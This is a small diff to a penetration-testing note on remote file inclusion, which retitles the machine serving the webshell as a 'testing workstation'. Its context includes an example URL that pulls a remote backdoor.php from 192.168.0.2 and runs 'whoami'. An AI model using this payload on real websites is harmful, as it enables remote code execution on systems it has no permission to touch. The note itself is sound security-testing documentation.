@@ -43,7 +43,7 @@ Two types exist:
 Precondition: non-default option `allow_url_fopen` on the webserver needs to be set
 
 - typically, [[2 Tech-Specifics/Network/Protocols/SMB|SMB]] and [[2 Tech-Specifics/Network/Protocols/HTTP(S)|HTTP(S)]] can be used
-- e.g. host a [[1 Methods/Security-Testing/3 Initial Access/Remote Shells|webshell]] on the attacker machine e.g. using the [[3 Tools/file-transfer/simple python webserver|simple python webserver]] or [[3 Tools/file-transfer/updog|updog]], and then include it on the victim webpage
+- e.g. host a [[1 Methods/Security-Testing/12 Command and Control/Remote Shells|webshell]] on the testing workstation e.g. using the [[3 Tools/file-transfer/simple python webserver|simple python webserver]] or [[3 Tools/file-transfer/updog|updog]], and then include it on the victim webpage
 - you can also include files from public sources
 - example of an exploited url: `<http://example.com/example/index.php?page=http>:<//192.168.0.2/backdoor.php&cmd=whoami>"
 
